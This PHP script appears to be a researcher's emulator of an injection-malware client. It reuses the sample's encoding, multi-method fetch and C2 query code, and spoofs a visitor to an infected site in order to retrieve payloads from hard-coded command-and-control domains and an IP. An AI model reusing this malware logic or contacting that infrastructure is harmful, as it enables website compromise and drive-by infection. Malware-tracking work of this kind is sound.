<?php

# Read the command line arguments
if ($argc != 2) {
    exit("Usage: program 'The User-Agent to use' \n ");
} else {
    $GLOBALS["user-agent"] = $argv[1];
}

# Create a fake random IP
function generateIP()
{
    $q1 = "" . mt_rand(1, 211) . "." . mt_rand(0, 254) . "." . mt_rand(0, 254) . "." . mt_rand(1, 211);
    return $q1;
}

function generate_c2c()
{
    # The function will return either one of those domains if 'stat-dns.com' resolve to '8.8.8.8'
    return "54dfa1cb.com";
    #return "33db9538.com";

    # We can also return directly the IP address of the C2
    #return "45.32.203.126";

    # The original DGA:
    #$arr = str_split(md5('.com'.gethostbyname('stat-dns.com')), 8);
    #return $arr[rand(0, 1)] . ".com";
}


function en2($s, $q)
{
    $g = "";

    while (strlen($g) < strlen($s)) {
        $q = pack("H*", md5($g . $q . "q1w2e3r4"));
        $g .= substr($q, 0, 8);
    }

    return $s ^ $g;
}

function g_1($url)
{
    if (function_exists("file_get_contents") === false) return false;
    $buf = @file_get_contents($url);

    if ($buf == "") return false;
    return $buf;
}

function g_2($url)
{
    if (function_exists("curl_init") === false) return false;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $res = curl_exec($ch);
    curl_close($ch);

    if ($res == "") return false;
    return $res;
}

function g_3($url)
{
    if (function_exists("file") === false) return false;
    $inc = @file($url);
    $buf = @implode("", $inc);
    if ($buf == "") return false;
    return $buf;
}

function g_4($url)
{
    if (function_exists("socket_create") === false) return false;
    $p = @parse_url($url);
    $host = $p["host"];

    if (!isset($p["query"])) $p["query"] = "";

    $uri = $p["path"] . "?" . $p["query"];
    $ip1 = @gethostbyname($host);
    $ip2 = @long2ip(@ip2long($ip1));

    if ($ip1 != $ip2) return false;

    $sock = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

    if (!@socket_connect($sock, $ip1, 80)) {
        @socket_close($sock);
        return false;
    }

    $req = "GET $uri HTTP/1.0\n";
    $req .= "Host: $host\n\n";
    socket_write($sock, $req);
    $buf = "";

    while ($t = socket_read($sock, 10000)) {
        $buf .= $t;
    }
    @socket_close($sock);

    if ($buf == "") return false;

    list($m, $buf) = explode("\r\n\r\n", $buf);
    return $buf;
}

function gtd($url)
{
    $co = "";
    $co = @g_1($url);

    if ($co !== false) return $co;
    $co = @g_2($url);

    if ($co !== false) return $co;
    $co = @g_3($url);

    if ($co !== false) return $co;
    $co = @g_4($url);

    if ($co !== false) return $co;
    return "";
}

if (!function_exists("comgzi")) {
    function comgzi($gzData)
    {
        if (substr($gzData, 0, 3) == "\x1f\x8b\x08") {
            $i = 10;
            $flg = ord(substr($gzData, 3, 1));

            if ($flg > 0) {
                if ($flg & 4) {
                    list($xlen) = unpack("v", substr($gzData, $i, 2));
                    $i = $i + 2 + $xlen;
                }

                if ($flg & 8) $i = strpos($gzData, "\0", $i) + 1;
                if ($flg & 16) $i = strpos($gzData, "\0", $i) + 1;
                if ($flg & 2) $i = $i + 2;
            }

            return @gzinflate(substr($gzData, $i, -8));
        } else {
            return false;
        }
    }
}
function k34($op, $text)
{
    return base64_encode(en2($text, $op));
}

function check212($param)
{
    if (!isset($_SERVER[$param]))
        $a = "non";
    else {
        if ($_SERVER[$param] == "")
            $a = "non";
        else
            $a = $_SERVER[$param];
    }

    return $a;
}

if (!function_exists("dcoo")) {
    function dcoo($cz, $length = null)
    {
        if (false !== ($dz = @gzinflate($cz))) return $dz;
        if (false !== ($dz = @comgzi($cz))) return $dz;
        if (false !== ($dz = @gzuncompress($cz))) return $dz;

        if (function_exists("gzdecode")) {
            $dz = @gzdecode($cz);
            if (false !== $dz) return $dz;
        }

        return $cz;
    }
}

function day212()
{
    # Original code
    /*$a = check212("HTTP_USER_AGENT");
    $b = check212("HTTP_REFERER");
    $c = check212("REMOTE_ADDR");
    $d = check212("HTTP_HOST");
    $e = check212("PHP_SELF");*/

    # The UA of the client.
    # Must not be a known crawler (google,slurp,msnbot,ia_archiver,yandex,rambler)
    # The UA will make the C2 trigger different payloads.
    # Case 1 (Chrome): $a = "Windows Chrome" is enough to trigger the injection.
    # Case 2 (IE): $a = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko" is enough to trigger the injection.
    $a = $GLOBALS["user-agent"];

    # The referer of the client
    $b = "https://www.google.com/";

    # The source IP of the client
    $c = generateIP();

    # The actual infected website redirecting the client
    $d = "gadflyonline.com";

    # Name of the infected webpage, must not contain the word 'admin'
    $e = "/home/index.php";

    $op = mt_rand(100000, 999999);
    $g4 = $op . "?" . urlencode(urlencode(k34($op, $a) . "." . k34($op, $b) . "." . k34($op, $c) . "." . k34($op, $d) . "." . k34($op, $e)));
    $url = "http://" . generate_c2c() . "/" . $g4;
    $ca1 = en2(@gtd($url), $op);
    $a1 = @explode("!NF0", $ca1);

    if (sizeof($a1) >= 2) {
        $o1 = $a1[1];
        echo "injected:\n" . $a1[1] . "\n";
    } else {
        $o1 = "";
        echo "no content injected\n";
    }


    return $o1;
}

day212();

?>
